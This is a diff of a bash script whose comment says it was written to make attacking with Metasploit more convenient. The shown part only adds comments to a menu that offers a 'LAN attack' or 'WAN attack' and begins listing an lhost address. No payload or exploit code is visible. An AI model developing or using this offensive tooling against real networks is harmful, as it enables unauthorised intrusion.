@@ -1,14 +1,15 @@
 #! /bin/bash
 # it has been created by sayon to attack using metasoloit more convinient way.
 
-echo "Virus for.."
-echo  --------------
-echo "|1.LAN attack|"
-echo "|2.WAN attack|"
-echo  --------------
-echo -e "which attack: \c"
-read attack
-if [ $attack == "1"  ]
+echo "Virus for.."         #
+echo  --------------        #
+echo "|1.LAN attack|"       # this part ask for if the attack is for lan or wan
+echo "|2.WAN attack|"      #
+echo  --------------        #
+echo -e "which attack: \c"  #
+                           #
+read attack                   
+if [ $attack == "1"  ]    
    then 
       echo  ------------------------
       echo "|1.lhost=192.168.8.100 |"
